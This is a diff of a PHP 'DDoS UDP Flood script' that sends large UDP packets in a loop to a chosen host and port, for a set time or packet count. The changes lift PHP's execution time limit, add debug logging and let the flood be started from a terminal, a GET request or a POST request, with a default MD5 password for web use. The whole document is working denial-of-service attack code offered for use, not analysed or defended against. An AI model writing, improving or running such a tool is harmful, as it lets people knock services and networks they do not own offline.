@@ -36,6 +36,9 @@ define('DDOS_VERSION',				'0.2' );
 // MD5 Password to be used when the script is executed from the webserver, default is "apple"
 define('DDOS_PASSWORD',				'1f3870be274f6c49b3e31a0c6728957f' );
 
+// Script max execution time
+define('DDOS_MAX_EXECUTION_TIME',0);
+
 // Default and max packets size
 define('DDOS_DEFAULT_PACKET_SIZE',	65000 );
 define('DDOS_MAX_PACKET_SIZE',		65000 );
@@ -67,6 +70,10 @@ define('DDOS_OUTPUT_STATUS_SUCCESS','success' );
  */
 class DDoS {
 	
+	/**
+	 * Default parameters
+	 * @var array
+	 */
 	private $params = array(
 			'host' => 	'',
 			'port' => 	'',
@@ -79,6 +86,10 @@ class DDoS {
 	);
 	
 	
+	/**
+	 * Log labels
+	 * @var array
+	 */
 	private $log_labels = array(
 			DDOS_LOG_DEBUG => 'debug',
 			DDOS_LOG_INFO => 'info',
@@ -87,8 +98,18 @@ class DDoS {
 			DDOS_LOG_ERROR => 'error'
 	);
 	
+	
+	/**
+	 * Content type to sent in header
+	 * @var string
+	 */
 	private $content_type = "";
 	
+	
+	/**
+	 * Output buffer, will be printed later in text,json or xml format
+	 * @var array
+	 */
 	private $output = array();
 	
 	
@@ -96,17 +117,24 @@ class DDoS {
 	 * Initializer
 	 */
 	public function __construct($params = array()) {
+		
 		ob_start();
 		
+		ini_set('max_execution_time',DDOS_MAX_EXECUTION_TIME);
+		
 		$this->set_params($params);
+		
 		$this->set_content_type();
 		
+		$this->signature();
+
 		if(isset($this->params['help'])) {
 			$this->usage();
 			exit;
 		}
 		
 		$this->validate_params();
+
 		
 		$this->attack();
 		
@@ -116,14 +144,22 @@ class DDoS {
 	}
 	
 	
+	/**
+	 * Prints the script name and version number
+	 */
+	public function signature() {
+		if(DDOS_OUTPUT_FORMAT_TEXT == $this->get_param('format')) {
+			$this->println('DDoS UDP Flood script');
+			$this->println('version '.DDOS_VERSION);
+			$this->println();
+		}
+	}
+	
 	
 	/**
 	 * Prints the script usage
 	 */
-	function usage() {
-		$this->println('DDoS UDP Flood script');
-		$this->println('version '.DDOS_VERSION);
-		$this->println();
+	public function usage() {
 		$this->println("EXAMPLES:");
 		$this->println("from terminal:  php ./".basename(__FILE__)." host=TARGET port=PORT time=SECONDS packet=NUMBER bytes=NUMBER");
 		$this->println("from webserver: http://localhost/ddos.php?pass=PASSWORD&host=TARGET&port=PORT&time=SECONDS&packet=NUMBER&bytes=NUMBER");
@@ -146,23 +182,33 @@ class DDoS {
 	}
 	
 	
+	/**
+	 * Start the UDP flood attack
+	 * TODO Rewrite the attack code, need to remove the double loop and to find a system to
+	 * 		print out a progress bar when we are in text mode
+	 */
 	private function attack(){
 		
 		$packets = 0;
 		$message = str_repeat("0", $this->get_param('bytes'));
 		
-		$this->log("DDos UDP flood started");
-		if($this->get_param('time')){
+		$this->log('DDos UDP flood started');
+		
+		// Time based attack
+		if($this->get_param('time')) {
+			
 			$exec_time = $this->get_param('time');
 			$max_time = time() + $exec_time;
 		
 			while(time() < $max_time){
 				$packets++;
-				if($this->udp_connect($this->get_param('host'),$this->get_param('port'),$message)) {
-					// we are attacking
-				}
+				$this->log('Sending packet #'.$packets,DDOS_LOG_DEBUG);
+				$this->udp_connect($this->get_param('host'),$this->get_param('port'),$message);
 			}
-			$timeStr = $exec_time. " seconds";
+			$timeStr = $exec_time. ' second';
+			if(1 != $exec_time) {
+				$timeStr .= 's';
+			}
 		}
 		// Packet number based attack
 		else {
@@ -171,24 +217,26 @@ class DDoS {
 		
 			while($packets < $max_packet){
 				$packets++;
-				if($this->udp_connect($this->get_param('host'),$this->get_param('port'),$message)) {
-					// we are attacking
-				}
+				$this->log('Sending packet #'.$packets,DDOS_LOG_DEBUG);
+				$this->udp_connect($this->get_param('host'),$this->get_param('port'),$message);
 			}
 			$exec_time = time() - $start_time;
 		
 			// If the script end before 1 sec, all the packets were sent in 1 sec
-			if($exec_time==0){
+			if($exec_time <= 1){
 				$exec_time=1;
-				$timeStr = "less than a second";
+				$timeStr = 'about a second';
 			}
 			else {
-				$timeStr = "about " . $exec_time . " seconds";
+				$timeStr = 'about ' . $exec_time . ' seconds';
 			}
 		}
 		
 		$this->log("DDoS UDP flood completed");
+		
 		$data = $this->params;
+		
+		// We don't need to send pass, packets and time as data for json and xml, ad we are sending the total
 		unset($data['pass']);
 		unset($data['packet']);
 		unset($data['time']);
@@ -197,9 +245,12 @@ class DDoS {
 		$data['total_packets'] = $packets;
 		$data['total_size'] = $this->format_bytes($packets*$data['bytes']);
 		$data['duration'] = $timeStr;
-		$data['avarage'] = round($packets/$exec_time, 2);
+		$data['average'] = round($packets/$exec_time, 2);
+		
 		$this->set_output('UDP flood completed', DDOS_OUTPUT_STATUS_SUCCESS,$data);
+		
 		$this->print_output();
+		
 		exit;
 	}
 	
@@ -217,17 +268,25 @@ class DDoS {
 		if(0 == $p) {
 			$p = rand(1,rand(1,65535));
 		}
-	
+		
+		$this->log("Trying to open socket udp://$h:$p",DDOS_LOG_DEBUG);
 		$fp = @fsockopen('udp://'.$h, $p, $errno, $errstr, 30);
 	
 		if(!$fp) {
-			$this->log("[UDP ERROR] $errstr ($errno)",DDOS_LOG_DEBUG);
+			$this->log("UDP socket error: $errstr ($errno)",DDOS_LOG_DEBUG);
 			$ret = false;
 		}
 		else {
-			@fwrite($fp, $out);
-			fclose($fp);
+			$this->log("Socket opened with $h on port $p",DDOS_LOG_DEBUG);
+			if(!@fwrite($fp, $out)) {
+				$this->log("Error during sending data",DDOS_LOG_ERROR);
+			}
+			else {
+				$this->log("Data sent successfully",DDOS_LOG_DEBUG);
+			}
+			@fclose($fp);
 			$ret = true;
+			$this->log("Closing socket udp://$h:$p",DDOS_LOG_DEBUG);
 		}
 	
 		return $ret;
@@ -241,18 +300,17 @@ class DDoS {
 	 */
 	private function set_params($params = array()) {
 		
-		if($this->is_cli()) {
-			global $argv;
-			parse_str(implode('&', array_slice($argv, 1)), $params);
-		}
-		else {
-			foreach($_GET as $index => $value) {
-				$params[$index] = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
+		$original_params = array_keys($this->params);
+		$original_params[] = 'help';
+		
+		foreach($params as $key => $value) {
+			if(!in_array($key, $original_params)) {
+				$this->set_output("Unknown param $key", DDOS_OUTPUT_STATUS_ERROR);
+				$this->print_output();
+				exit(1);
 			}
+			$this->set_param($key, $value);
 		}
-		
-		$this->params = array_merge($this->params, $params);
-		
 	}
 	
 	/**
@@ -322,16 +380,14 @@ class DDoS {
 		return isset($this->params[$param]) ? $this->params[$param] : null;
 	}
 	
-	
+	/**
+	 * Add a parameter 
+	 * @param string 	$param
+	 * @param mixed 	$value
+	 */
 	private function set_param($param,$value) {
-		if(!in_array($param,array_keys($this->params))) {
-			$this->set_output("Unkown parameter "+$param, DDOS_OUTPUT_STATUS_ERROR);
-			$this->print_output();
-			exit(1);
-		}
-		else {
-			$this->params[$param] = $value;
-		}		
+		
+		$this->params[$param] = $value;
 	}
 	
 	/**
@@ -368,7 +424,7 @@ class DDoS {
 	 * Check if we are running the script from terminal or from a web server
 	 * @return boolean True if sapi name is cli
 	 */
-	public function is_cli() {
+	public static function is_cli() {
 		return php_sapi_name() == 'cli';
 	}
 	
@@ -491,4 +547,23 @@ class DDoS {
 	}
 }
 
-$ddos = new DDoS();
+
+
+$params = array();
+if(DDoS::is_cli()) {
+	global $argv;
+	parse_str(implode('&', array_slice($argv, 1)), $params);
+}
+elseif(!empty($_POST)) {
+	foreach($_POST as $index => $value) {
+		$params[$index] = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
+	}
+}
+elseif(!empty($_GET['host'])) {
+	foreach($_GET as $index => $value) {
+		$params[$index] = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
+	}
+}
+
+
+$ddos = new DDoS($params);
